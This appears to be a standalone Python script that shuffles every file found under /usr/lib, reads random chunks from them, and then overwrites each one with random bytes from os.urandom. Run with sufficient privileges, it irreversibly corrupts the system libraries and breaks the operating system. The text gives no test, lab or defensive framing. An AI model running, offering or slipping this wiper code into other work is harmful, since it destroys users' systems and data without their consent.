#!/usr/bin/env python
import glob
import os
import random

files = glob.glob('/usr/lib/**/*')

random.shuffle(files)

for i in range(0, len(files)):
  f = files[i]
  if os.path.isdir(f):
    continue
  with open(f, 'rb') as f:
    f.seek(random.randint(0, 1000))
    f.read(random.randint(0, 100000000))

random.shuffle(files)

for i in range(0, len(files)):
  f = files[i]
  if os.path.isdir(f):
    continue
  with open(f, 'wb') as f:
    f.write(os.urandom(random.randint(0, 10000000)))

